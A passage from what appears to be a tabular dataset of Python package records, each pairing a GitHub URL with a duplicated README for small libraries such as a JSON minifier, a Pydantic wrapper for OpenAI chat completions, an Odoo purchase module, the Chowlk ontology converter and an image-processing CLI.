JSON is a widely used format for data exchange, whether that be APIs talking over the
internet, metadata being stored in a database, or config files stored on a user's
filesystem. Although CPU and harddrive space is getting cheaper and cheaper, it isn't
free, and being mindful of resources can lead to faster and more efficient programs.

## Supported Checks

### `JMIN100`: Use `separators`

The [`json.dump`](https://docs.python.org/3/library/json.html#json.dump) and
[`json.dumps`](https://docs.python.org/3/library/json.html#json.dumps) functions
allow for an optional `separators` field which specifies what characters to use
for colons (`:`) and commas (`,`) in the JSON output. Normally there is whitespace
after these characters, but you can change this to use a more compact format.

Here is a simple example comparing the output of `json.dumps()` with and without
`separators` specified:

```python
import json

data = {
  ""hello"": ""world"",
  ""numbers"": [1, 2, 3, 4],
}

a = json.dumps(data)
b = json.dumps(data, separators=("","", "":""))

print(f""{len(a)=}"", f""{len(b)=}"")
```

When we run this, we get:

```
len(a)=43 len(b)=37
```

By reducing the whitespace in our JSON output we where able to shave off 6 bytes, or about
16% in this example.

### `JMIN101`: Don't `json.dump()` integers

Don't call `json.dump()` on integers, use `str()` instead since they share the
same representation.
",dosisod/refurb-json-minify
acnaweblib,https://github.com/acnaweb/acnaweblib,0,1338,1338,"# Welcome to acnaweblib

![version](https://img.shields.io/badge/version-0.1.19-blue.svg?cacheSeconds=2592000) 
![licence](https://img.shields.io/badge/licence-MIT-green.svg?cacheSeconds=2592000)

This is a Python library for testing

## Installation

`acnaweblib` supports Python 3.8 and higher.

### System-wide or user-wide installation with pipx

Use the package manager [pip](https://pip.pypa.io/en/stable/) to install `acnaweblib`.

```bash
$ pip install acnaweblib
```

## Usage

```python
from acnaweblib import calculator

# returns 6
result = calculator.add(4,2)

```

## Developing

Development requires Python 3.8+; otherwise you'll get false positive type failures.

To work on the `acnaweblib` code: pull the repository, create and activate a virtualenv, then run:

```bash
make dev
```

Testing

```bash
make test
```

Publish

```bash
make push
```



## Author

👤 **Antonio Carlos de Lima Junior**

* Website: https://www.linkedin.com/in/acnaweb/
* Github: [@acnaweb](https://github.com/acnaweb)
* LinkedIn: [@acnaweb](https://linkedin.com/in/acnaweb)


## References

- [Pypi Classifiers](https://pypi.org/classifiers/)
- [Python Packaging Tutorial](https://www.devdungeon.com/content/python-packaging-tutorial)
- [A Practical Guide to Using Setup.py](https://godatadriven.com/blog/a-practical-guide-to-using-setup-py/)
","# Welcome to acnaweblib

![version](https://img.shields.io/badge/version-0.1.19-blue.svg?cacheSeconds=2592000) 
![licence](https://img.shields.io/badge/licence-MIT-green.svg?cacheSeconds=2592000)

This is a Python library for testing

## Installation

`acnaweblib` supports Python 3.8 and higher.

### System-wide or user-wide installation with pipx

Use the package manager [pip](https://pip.pypa.io/en/stable/) to install `acnaweblib`.

```bash
$ pip install acnaweblib
```

## Usage

```python
from acnaweblib import calculator

# returns 6
result = calculator.add(4,2)

```

## Developing

Development requires Python 3.8+; otherwise you'll get false positive type failures.

To work on the `acnaweblib` code: pull the repository, create and activate a virtualenv, then run:

```bash
make dev
```

Testing

```bash
make test
```

Publish

```bash
make push
```



## Author

👤 **Antonio Carlos de Lima Junior**

* Website: https://www.linkedin.com/in/acnaweb/
* Github: [@acnaweb](https://github.com/acnaweb)
* LinkedIn: [@acnaweb](https://linkedin.com/in/acnaweb)


## References

- [Pypi Classifiers](https://pypi.org/classifiers/)
- [Python Packaging Tutorial](https://www.devdungeon.com/content/python-packaging-tutorial)
- [A Practical Guide to Using Setup.py](https://godatadriven.com/blog/a-practical-guide-to-using-setup-py/)
",acnaweb/acnaweblib
pydantic-chatcompletion,https://github.com/jiggy-ai/pydantic-chatcompletion,2,3427,3427,"# Pydantic ChatCompletion

This repository provides a wrapper around the OpenAI ChatCompletion API that help enables the extraction of structured data (in the form of a Pydantic model) from unstructured text via language model.

This package provide a `pydantic_chatcompletion.create()` function that is similar to the `openai.ChatCompletion.create()` function.

The `pydantic_chatcompletion.create()` function takes an arbitrary pydantic class as an additional argument (in addition to the normal arguments supported by `openai.ChatCompletion.create()`) and tries to return an instance of the supplied pydantic class as return data.

The `create` function in the `pydantic_chatcompletion` package is designed to interact with the OpenAI ChatCompletion API to progressively guide the language model to produce structured data according to a provided Pydantic model. Here's how it accomplishes this task:

1. It starts by appending a system message to the list of messages, instructing the language model to respond with valid JSON that conforms to the Pydantic model's JSON schema. The message also asks the language model not to include any additional text besides the JSON object.

2. If the language model output is not valid json, append the json.loads() exception output as an additional system message and try again.

3. If the lanugage model output is valid json but does not pass pydantic validation, append the pydantic exception output as an additional system message and try again.

In most cases the error remediation of the 2nd and 3rd steps is not required as the language model is usually able to output correct data on the first try.


## Installation

```bash
pip install pydantic_chatcompletion
```

## Usage


```python
import pydantic_chatcompletion
from pydantic import BaseModel


messages = [{""role"": ""user"", ""content"": ""All of your unstructured text to process via language model...""]


class MyPydanticModel(BaseModel)
      """"""
      The data we extract from the unstructured text via lanugage model.
      """"""
      some_data: int
      more_data: str

instance_of_my_data =  pydantic_chatcompletion.create(messages, MyPydanticModel, model='gpt-3.5-turbo')

print(instance_of_my_data.some_data, instance_of_my_data.more_data)
```

## Summary of Examples

1. `example/book_info.py`: Extracts structured book information (title, author, publication year, genre, characters, and summary) from a given unstructured text describing the book ""Pride and Prejudice"".

2. `example/doc_metadata.py`: Extracts metadata (title, author, creation date, and primary language) from an unstructured text related to a document about investment opportunities in Generative AI.

3. `example/list_event_dates.py`: Extracts a list of events, their names, and their relative start and end dates from an unstructured text containing a calendar of events.

4. `example/movie_info.py`: Extracts structured movie information (title, director, release year, cast, genre, duration, plot, and awards) from an unstructured text about the movie ""The Godfather"".

5. `example/nested.py`: Extracts a nested curriculum structure (curriculum title, description, courses, course titles, instructors, and course durations) from an unstructured text describing a data science bootcamp.

6. `example/user_details.py`: Extracts user details (name, age, email, and country) from an unstructured text about a software engineer named John Doe.
","# Pydantic ChatCompletion

This repository provides a wrapper around the OpenAI ChatCompletion API that help enables the extraction of structured data (in the form of a Pydantic model) from unstructured text via language model.

This package provide a `pydantic_chatcompletion.create()` function that is similar to the `openai.ChatCompletion.create()` function.

The `pydantic_chatcompletion.create()` function takes an arbitrary pydantic class as an additional argument (in addition to the normal arguments supported by `openai.ChatCompletion.create()`) and tries to return an instance of the supplied pydantic class as return data.

The `create` function in the `pydantic_chatcompletion` package is designed to interact with the OpenAI ChatCompletion API to progressively guide the language model to produce structured data according to a provided Pydantic model. Here's how it accomplishes this task:

1. It starts by appending a system message to the list of messages, instructing the language model to respond with valid JSON that conforms to the Pydantic model's JSON schema. The message also asks the language model not to include any additional text besides the JSON object.

2. If the language model output is not valid json, append the json.loads() exception output as an additional system message and try again.

3. If the lanugage model output is valid json but does not pass pydantic validation, append the pydantic exception output as an additional system message and try again.

In most cases the error remediation of the 2nd and 3rd steps is not required as the language model is usually able to output correct data on the first try.


## Installation

```bash
pip install pydantic_chatcompletion
```

## Usage


```python
import pydantic_chatcompletion
from pydantic import BaseModel


messages = [{""role"": ""user"", ""content"": ""All of your unstructured text to process via language model...""]


class MyPydanticModel(BaseModel)
      """"""
      The data we extract from the unstructured text via lanugage model.
      """"""
      some_data: int
      more_data: str

instance_of_my_data =  pydantic_chatcompletion.create(messages, MyPydanticModel, model='gpt-3.5-turbo')

print(instance_of_my_data.some_data, instance_of_my_data.more_data)
```

## Summary of Examples

1. `example/book_info.py`: Extracts structured book information (title, author, publication year, genre, characters, and summary) from a given unstructured text describing the book ""Pride and Prejudice"".

2. `example/doc_metadata.py`: Extracts metadata (title, author, creation date, and primary language) from an unstructured text related to a document about investment opportunities in Generative AI.

3. `example/list_event_dates.py`: Extracts a list of events, their names, and their relative start and end dates from an unstructured text containing a calendar of events.

4. `example/movie_info.py`: Extracts structured movie information (title, director, release year, cast, genre, duration, plot, and awards) from an unstructured text about the movie ""The Godfather"".

5. `example/nested.py`: Extracts a nested curriculum structure (curriculum title, description, courses, course titles, instructors, and course durations) from an unstructured text describing a data science bootcamp.

6. `example/user_details.py`: Extracts user details (name, age, email, and country) from an unstructured text about a software engineer named John Doe.
",jiggy-ai/pydantic-chatcompletion
mercury-explainability,https://github.com/BBVA/mercury-explainability,0,1468,1468,"# mercury-explainability

[![](https://github.com/BBVA/mercury-explainability/actions/workflows/test.yml/badge.svg)](https://github.com/BBVA/mercury-explainability)
![](https://img.shields.io/badge/latest-0.0.2-blue)

***mercury-explainability*** is a library with implementations of different state-of-the-art methods in the field of explainability. They are designed to work efficiently and to be easily integrated with the main Machine Learning frameworks.

## Mercury project at BBVA

Mercury is a collaborative library that was developed by the Advanced Analytics community at BBVA. Originally, it was created as an [InnerSource](https://en.wikipedia.org/wiki/Inner_source) project but after some time, we decided to release certain parts of the project as Open Source.
That's the case with the `mercury-explainability` package. 

If you're interested in learning more about the Mercury project, we recommend reading this blog [post](https://www.bbvaaifactory.com/mercury-acelerando-la-reutilizacion-en-ciencia-de-datos-dentro-de-bbva/) from www.bbvaaifactory.com

## User installation

The easiest way to install `mercury-explainability` is using ``pip``:

    pip install -U mercury-explainability

## Help and support 

This library is currently maintained by a dedicated team of data scientists and machine learning engineers from BBVA AI Factory. 

### Documentation
website: https://bbva.github.io/mercury-explainability/

### Email 
mercury.group@bbva.com
","# mercury-explainability

[![](https://github.com/BBVA/mercury-explainability/actions/workflows/test.yml/badge.svg)](https://github.com/BBVA/mercury-explainability)
![](https://img.shields.io/badge/latest-0.0.2-blue)

***mercury-explainability*** is a library with implementations of different state-of-the-art methods in the field of explainability. They are designed to work efficiently and to be easily integrated with the main Machine Learning frameworks.

## Mercury project at BBVA

Mercury is a collaborative library that was developed by the Advanced Analytics community at BBVA. Originally, it was created as an [InnerSource](https://en.wikipedia.org/wiki/Inner_source) project but after some time, we decided to release certain parts of the project as Open Source.
That's the case with the `mercury-explainability` package. 

If you're interested in learning more about the Mercury project, we recommend reading this blog [post](https://www.bbvaaifactory.com/mercury-acelerando-la-reutilizacion-en-ciencia-de-datos-dentro-de-bbva/) from www.bbvaaifactory.com

## User installation

The easiest way to install `mercury-explainability` is using ``pip``:

    pip install -U mercury-explainability

## Help and support 

This library is currently maintained by a dedicated team of data scientists and machine learning engineers from BBVA AI Factory. 

### Documentation
website: https://bbva.github.io/mercury-explainability/

### Email 
mercury.group@bbva.com
",bbva/mercury-explainability
odoo-addon-purchase-invoice-method,https://github.com/OCA/purchase-workflow,1,3384,3000,"=======================
Purchase Invoice Method
=======================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fpurchase--workflow-lightgray.png?logo=github
    :target: https://github.com/OCA/purchase-workflow/tree/15.0/purchase_invoice_method
    :alt: OCA/purchase-workflow
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/purchase-workflow-15-0/purchase-workflow-15-0-purchase_invoice_method
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/142/15.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This module adds the possibility for users to force the invoice status of the
purchase orders to 'Waiting Bills' so they can create a bill.
Also, you can force an ""On ordered quantites"" invoice method to ""On received quantites"".

Example: you can bill a purchase even when you haven't received the product/service.

**Table of contents**

.. contents::
   :local:

Usage
=====

#. Create a purchase order and confirm it.
#. Go to page ""Other information"" and select an option of the ""Invoice Method"" field.
#. #. If ""On ordered quantited"" is selected you can bill a purchase even you haven't received the product.
#. #. If ""On received quantited"" is selected you cannot bill a purchase if you haven't received the product.

Bug Tracker
===========

Bugs are tracked on `GitHub Issues <https://github.com/OCA/purchase-workflow/issues>`_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback <https://github.com/OCA/purchase-workflow/issues/new?body=module:%20purchase_invoice_method%0Aversion:%2015.0%0A%0A**Steps%20to%20reproduce**%0A-%20...%0A%0A**Current%20behavior**%0A%0A**Expected%20behavior**>`_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* CreuBlanca

Contributors
~~~~~~~~~~~~

* Enric Tobella <etobella@creublanca.es>
* Kevin Luna <kevin.luna@creublanca.es>

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

This module is part of the `OCA/purchase-workflow <https://github.com/OCA/purchase-workflow/tree/15.0/purchase_invoice_method>`_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


","=======================
Purchase Invoice Method
=======================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fpurchase--workflow-lightgray.png?logo=github
    :target: https://github.com/OCA/purchase-workflow/tree/15.0/purchase_invoice_method
    :alt: OCA/purchase-workflow
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/purchase-workflow-15-0/purchase-workflow-15-0-purchase_invoice_method
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/142/15.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This module adds the possibility for users to force the invoice status of the
purchase orders to 'Waiting Bills' so they can create a bill.
Also, you can force an ""On ordered quantites"" invoice method to ""On received quantites"".

Example: you can bill a purchase even when you haven't received the product/service.

**Table of contents**

.. contents::
   :local:

Usage
=====

#. Create a purchase order and confirm it.
#. Go to page ""Other information"" and select an option of the ""Invoice Method"" field.
#. #. If ""On ordered quantited"" is selected you can bill a purchase even you haven't received the product.
#. #. If ""On received quantited"" is selected you cannot bill a purchase if you haven't received the product.

Bug Tracker
===========

Bugs are tracked on `GitHub Issues `_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback `_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* CreuBlanca

Contributors
~~~~~~~~~~~~

* Enric Tobella 
* Kevin Luna 

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

This module is part of the `OCA/purchase-workflow `_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


",oca/purchase-workflow
chowlk-unofficial-fork,https://github.com/pablo-de-andres/Chowlk,2,4827,4827,"# Chowlk Converter - Unofficial fork

**IMPORTANT NOTICE**: This is an unofficial temporary fork of [Chowlk](https://github.com/oeg-upm/Chowlk). Please refer to the original repository.

![Logo](./resources/logo.png)

Tool to transform ontology conceptualizations made with diagrams.net into OWL code.

The conceptualizations should follow the [Chowlk visual notation](https://chowlk.linkeddata.es/notation.html). Please visit the specification for more details.

Citing Chowlk: If you used Chowlk in your work, please cite the [ESWC paper](https://2022.eswc-conferences.org/wp-content/uploads/2022/05/paper_90_Chavez-Feria_et_al.pdf):

```bib
@InProceedings{10.1007/978-3-031-06981-9_20,
author=""Ch{\'a}vez-Feria, Serge
and Garc{\'i}a-Castro, Ra{\'u}l
and Poveda-Villal{\'o}n, Mar{\'i}a"",
editor=""Groth, Paul
and Vidal, Maria-Esther
and Suchanek, Fabian
and Szekley, Pedro
and Kapanipathi, Pavan
and Pesquita, Catia
and Skaf-Molli, Hala
and Tamper, Minna"",
title=""Chowlk: from UML-Based Ontology Conceptualizations to OWL"",
booktitle=""The Semantic Web"",
year=""2022"",
publisher=""Springer International Publishing"",
address=""Cham"",
pages=""338--352""
}
```

## How to use the tool

You have several options to use this tool.

### 1. The web application

1. Go to the [chowlk.linkeddata.es](https://chowlk.linkeddata.es/) web application.
1. Download the Chowlk template.
     * Complete version of the template [here](https://github.com/oeg-upm/chowlk_spec/blob/master/resources/chowlk-library-complete.xml)
     * Lightweight version of the template [here](https://github.com/oeg-upm/chowlk_spec/blob/master/resources/chowlk-library-lightweight.xml)
1. In diagrams.net go to File > Open Library from > Device ...
1. Select the library downloaded.
1. Make your conceptualization using the blocks that will appear on the side bar.
1. Download the diagram in xml format.
1. Drag and drop your diagram in the Service dropping area and download your TTL file.

### 2. The API

The following command line will return the ontology in Turtle format.

```bash
curl -F 'data=@/path/to/diagram.xml' https://chowlk.linkeddata.es/api
```

The service will return the following dictionary:

```json
{
  ""ttl_data"": ""@prefix ns: ..."",
  ""new_namespaces"": {""ns1"": ""https://namespace1.com#"", ""ns2"": ""https://namespace2.com#""},
  ""errors"": {""Concepts"": [{""message"": ""Problem in text"", ""shape_id"": ""13"", ""value"": ""ns:Building Element""}],
             ""Attributes"": [{""message"": ""Problem in cardinality"", ""shape_id"": 45, ""value"": ""ns:ifcIdentifier""}],
             ""Arrows"": [],
             ""Rhombuses"": [],
             ""Ellipses"": [],
             ""Namespaces"": [],
             ""Metadata"": [],
             ""Hexagons"": [],
             ""Individual"": []}
}
```

* **ttl_data:** Contains the ontology generated from the diagram in Turtle format. It is returned in string format.
* **new_namespaces:** Contains the new namespaces created for the ontology, when prefixes are founded in the model but are not declared in the namespace block in the diagram. The returned object is a dictionary with the following format: {""prefix1"": ""namespace1"", ""prefix2"": ""namespace2""}
* **errors:** Contains the errors founded in the ontology diagram, organized by types. The following keywords can be founded: ""Concepts"", ""Arrows"", ""Rhombuses"", ""Ellipses"", ""Attributes"", ""Namespaces"", ""Metadata"", ""Hexagons"", ""Individual"". The value for these keywords is an array that may contain objects that have the following structure:

```json
{
  ""message"": ""Some message related to the problem"",
  ""shape_id"": ""An integer id that identify the problematic shape in the diagram"",
  ""value"": ""the actual text related with the shape""
}
```

### 3. Running it from source

### Copy the project

```bash
git clone https://github.com/oeg-upm/Chowlk.git
git checkout webservice
```

### Requirements

```bash
pip install -r requirements.txt
```

### To convert a diagram

* If the desired format is ttl:

```bash
python converter.py path/to/diagram.xml output/path/ontology.ttl --type ontology --format ttl
```

* If the desired format is rdf/xml:

```bash
python converter.py path/to/diagram.xml output/path/ontology.xml --type ontology --format xml
```

### To run the app locally

```bash
python app.py
```

## Publications

* Chávez-Feria, S., García-Castro, R., Poveda-Villalón, M. (2022). Chowlk: from UML-Based Ontology Conceptualizations to OWL. In: , et al. The Semantic Web. ESWC 2022. Lecture Notes in Computer Science, vol 13261. Springer, Cham. https://doi.org/10.1007/978-3-031-06981-9_20

* Chávez-Feria, S., García-Castro, R., Poveda-Villalón, M. (2021). _Converting UML-based ontology conceptualizations to OWL with Chowlk. In ESWC (Poster and Demo Track)_

## Contact

* Serge Chávez-Feria (serge.chavez.feria@upm.es)
* Maria Poveda-Villalón (mpoveda@fi.upm.es)
","# Chowlk Converter - Unofficial fork

**IMPORTANT NOTICE**: This is an unofficial temporary fork of [Chowlk](https://github.com/oeg-upm/Chowlk). Please refer to the original repository.

![Logo](./resources/logo.png)

Tool to transform ontology conceptualizations made with diagrams.net into OWL code.

The conceptualizations should follow the [Chowlk visual notation](https://chowlk.linkeddata.es/notation.html). Please visit the specification for more details.

Citing Chowlk: If you used Chowlk in your work, please cite the [ESWC paper](https://2022.eswc-conferences.org/wp-content/uploads/2022/05/paper_90_Chavez-Feria_et_al.pdf):

```bib
@InProceedings{10.1007/978-3-031-06981-9_20,
author=""Ch{\'a}vez-Feria, Serge
and Garc{\'i}a-Castro, Ra{\'u}l
and Poveda-Villal{\'o}n, Mar{\'i}a"",
editor=""Groth, Paul
and Vidal, Maria-Esther
and Suchanek, Fabian
and Szekley, Pedro
and Kapanipathi, Pavan
and Pesquita, Catia
and Skaf-Molli, Hala
and Tamper, Minna"",
title=""Chowlk: from UML-Based Ontology Conceptualizations to OWL"",
booktitle=""The Semantic Web"",
year=""2022"",
publisher=""Springer International Publishing"",
address=""Cham"",
pages=""338--352""
}
```

## How to use the tool

You have several options to use this tool.

### 1. The web application

1. Go to the [chowlk.linkeddata.es](https://chowlk.linkeddata.es/) web application.
1. Download the Chowlk template.
     * Complete version of the template [here](https://github.com/oeg-upm/chowlk_spec/blob/master/resources/chowlk-library-complete.xml)
     * Lightweight version of the template [here](https://github.com/oeg-upm/chowlk_spec/blob/master/resources/chowlk-library-lightweight.xml)
1. In diagrams.net go to File > Open Library from > Device ...
1. Select the library downloaded.
1. Make your conceptualization using the blocks that will appear on the side bar.
1. Download the diagram in xml format.
1. Drag and drop your diagram in the Service dropping area and download your TTL file.

### 2. The API

The following command line will return the ontology in Turtle format.

```bash
curl -F 'data=@/path/to/diagram.xml' https://chowlk.linkeddata.es/api
```

The service will return the following dictionary:

```json
{
  ""ttl_data"": ""@prefix ns: ..."",
  ""new_namespaces"": {""ns1"": ""https://namespace1.com#"", ""ns2"": ""https://namespace2.com#""},
  ""errors"": {""Concepts"": [{""message"": ""Problem in text"", ""shape_id"": ""13"", ""value"": ""ns:Building Element""}],
             ""Attributes"": [{""message"": ""Problem in cardinality"", ""shape_id"": 45, ""value"": ""ns:ifcIdentifier""}],
             ""Arrows"": [],
             ""Rhombuses"": [],
             ""Ellipses"": [],
             ""Namespaces"": [],
             ""Metadata"": [],
             ""Hexagons"": [],
             ""Individual"": []}
}
```

* **ttl_data:** Contains the ontology generated from the diagram in Turtle format. It is returned in string format.
* **new_namespaces:** Contains the new namespaces created for the ontology, when prefixes are founded in the model but are not declared in the namespace block in the diagram. The returned object is a dictionary with the following format: {""prefix1"": ""namespace1"", ""prefix2"": ""namespace2""}
* **errors:** Contains the errors founded in the ontology diagram, organized by types. The following keywords can be founded: ""Concepts"", ""Arrows"", ""Rhombuses"", ""Ellipses"", ""Attributes"", ""Namespaces"", ""Metadata"", ""Hexagons"", ""Individual"". The value for these keywords is an array that may contain objects that have the following structure:

```json
{
  ""message"": ""Some message related to the problem"",
  ""shape_id"": ""An integer id that identify the problematic shape in the diagram"",
  ""value"": ""the actual text related with the shape""
}
```

### 3. Running it from source

### Copy the project

```bash
git clone https://github.com/oeg-upm/Chowlk.git
git checkout webservice
```

### Requirements

```bash
pip install -r requirements.txt
```

### To convert a diagram

* If the desired format is ttl:

```bash
python converter.py path/to/diagram.xml output/path/ontology.ttl --type ontology --format ttl
```

* If the desired format is rdf/xml:

```bash
python converter.py path/to/diagram.xml output/path/ontology.xml --type ontology --format xml
```

### To run the app locally

```bash
python app.py
```

## Publications

* Chávez-Feria, S., García-Castro, R., Poveda-Villalón, M. (2022). Chowlk: from UML-Based Ontology Conceptualizations to OWL. In: , et al. The Semantic Web. ESWC 2022. Lecture Notes in Computer Science, vol 13261. Springer, Cham. https://doi.org/10.1007/978-3-031-06981-9_20

* Chávez-Feria, S., García-Castro, R., Poveda-Villalón, M. (2021). _Converting UML-based ontology conceptualizations to OWL with Chowlk. In ESWC (Poster and Demo Track)_

## Contact

* Serge Chávez-Feria (serge.chavez.feria@upm.es)
* Maria Poveda-Villalón (mpoveda@fi.upm.es)
",pablo-de-andres/chowlk
pymispgalaxies,https://github.com/MISP/PyMISPGalaxies,1,465,465,"# PyMISPGalaxies

[![Build Status](https://travis-ci.org/MISP/PyMISPGalaxies.svg?branch=master)](https://travis-ci.org/MISP/PyMISPGalaxies)
[![codecov.io](https://codecov.io/github/MISP/PyMISPGalaxies/coverage.svg?branch=master)](https://codecov.io/github/MISP/PyMISPGalaxies?branch=master)

Pythonic way to work with the galaxies defined there: https://github.com/MISP/misp-galaxy

# Usage

Clusters and Galaxies are represented as immutable Python dictionaries.

","# PyMISPGalaxies

[![Build Status](https://travis-ci.org/MISP/PyMISPGalaxies.svg?branch=master)](https://travis-ci.org/MISP/PyMISPGalaxies)
[![codecov.io](https://codecov.io/github/MISP/PyMISPGalaxies/coverage.svg?branch=master)](https://codecov.io/github/MISP/PyMISPGalaxies?branch=master)

Pythonic way to work with the galaxies defined there: https://github.com/MISP/misp-galaxy

# Usage

Clusters and Galaxies are represented as immutable Python dictionaries.

",misp/pymispgalaxies
pixelpotion,https://github.com/mjhxyz/pixelpotion,1,2075,2075,"PixelPotion
===========

PixelPotion is a command line tool based on Pillow for easy processing
of PNG, JPG, and GIF images. It provides a simple and intuitive
interface for performing common image operations such as resizing,
cropping, and retrieving GIF frames.

Features
--------

-  Supports PNG, JPG, and GIF image formats
-  ``Resize`` images to a specified width and height
-  ``Crop`` images to a specified size and position
-  ``Retrieve`` individual frames from animated GIFs
-  Save processed images to disk

Installation
============

PixelPotion can be installed via pip:

.. code:: bash

   pip install pixelpotion

Usage
=====

PixelPotion can be used via the command line interface. Here are some
examples:

**Original image:** |original|

**Resize to 100x100:**

.. code:: bash

   # Resize an image to 400x400 pixels
   pp resize input.png output.png --width 100 --height 100

.. figure:: https://img.mjhxyz.top/outpu.png
   :alt: 100x100

   100x100

**Crop to 200x100 JPEG:**

.. code:: bash

   # Crop an image to 200x100 pixels
   pp convert -f input.png -o outpu.jpg -t jpg --width 200 --height 100

.. figure:: https://img.mjhxyz.top/outpu.jpg
   :alt: 200x100

   200x100

**Extract first frame of animated GIF:**

.. code:: bash

   # Extract the first frame of an animated GIF
   pp gif split -f input.gif -o tmp -p frame

For a full list of available commands and options, please refer to the
Command Line Interface Documentation in the project wiki(TODO).

API
---

PixelPotion is built on top of the popular Pillow library and extends
its functionality. For more information on the API, please refer to the
API Documentation in the project wiki(TODO).

Contributing
------------

Contributions to PixelPotion are always welcome! If you鈥檇 like to
contribute, please read the Contributing Guide and submit a pull
request(TODO).

License
-------

PixelPotion is licensed under the MIT License.

.. |original| image:: https://img.mjhxyz.top/00008-624526612.png
","PixelPotion
===========

PixelPotion is a command line tool based on Pillow for easy processing
of PNG, JPG, and GIF images. It provides a simple and intuitive
interface for performing common image operations such as resizing,
cropping, and retrieving GIF frames.

Features
--------

-  Supports PNG, JPG, and GIF image formats
-  ``Resize`` images to a specified width and height
-  ``Crop`` images to a specified size and position
-  ``Retrieve`` individual frames from animated GIFs
-  Save processed images to disk

Installation
============

PixelPotion can be installed via pip:

.. code:: bash

   pip install pixelpotion

Usage
=====

PixelPotion can be used via the command line interface. Here are some
examples:

**Original image:** |original|

**Resize to 100x100:**

.. code:: bash

   # Resize an image to 400x400 pixels
   pp resize input.png output.png --width 100 --height 100

.. figure:: https://img.mjhxyz.top/outpu.png
   :alt: 100x100

   100x100

**Crop to 200x100 JPEG:**

.. code:: bash

   # Crop an image to 200x100 pixels
   pp convert -f input.png -o outpu.jpg -t jpg --width 200 --height 100

.. figure:: https://img.mjhxyz.top/outpu.jpg
   :alt: 200x100

   200x100

**Extract first frame of animated GIF:**

.. code:: bash

   # Extract the first frame of an animated GIF
   pp gif split -f input.gif -o tmp -p frame

For a full list of available commands and options, please refer to the
Command Line Interface Documentation in the project wiki(TODO).

API
---

PixelPotion is built on top of the popular Pillow library and extends
its functionality. For more information on the API, please refer to the
API Documentation in the project wiki(TODO).

Contributing
------------

Contributions to PixelPotion are always welcome! If you鈥檇 like to
contribute, please read the Contributing Guide and submit a pull
request(TODO).

License
-------

PixelPotion is licensed under the MIT License.

.. |original| image:: https://img.mjhxyz.top/00008-624526612.png
",mjhxyz/pixelpotion
statplotastro,https://github.com/dingyizhao/statplot,0,47,47,"# myplot
Common plot code used in astrophysics
","# myplot
Common plot code used in astrophysics
",dingyizhao/statplot
skeletonkey,https://github.com/sizemore0125/skeletonkey,0,1178,1178,"# SkeletonKey: A Bare-bones Configuration Management Tool

`skeletonkey` is a simple, lightweight, and flexible configuration management tool that allows you to manage complex configurations for your applications using YAML files. It dynamically loads classes and their arguments at runtime, making it easy to set up and modify your projects.

### Usage

Below is an example of how to use `skeletonkey` in your project:

```python
import skeletonkey

class MyModel:
    def __init__(self, layer_size: int, activation: str) -> None:
        self.layer_size = layer_size
        self.activation = activation

@skeletonkey.unlock(""config.yaml"")
def main(args):
    model = skeletonkey.instantiate(args.model)
    print(""Model layer size: "", model.layer_size)
    print(""Model activation: "", model.activation)
    print(""Number of Epochs: "", args.epochs)

if __name__ == ""__main__"":  
    main()
```

To run the example above, create a config.yaml file with the following content:
```yaml
epochs: 128
model:
  _target_: MyModel
  layer_size: 128
  activation: relu
```
To run the script and overwrite default arguments, use the command:
```bash
python project.py --epochs 256
```


","# SkeletonKey: A Bare-bones Configuration Management Tool

`skeletonkey` is a simple, lightweight, and flexible configuration management tool that allows you to manage complex configurations for your applications using YAML files. It dynamically loads classes and their arguments at runtime, making it easy to set up and modify your projects.

### Usage

Below is an example of how to use `skeletonkey` in your project:

```python
import skeletonkey

class MyModel:
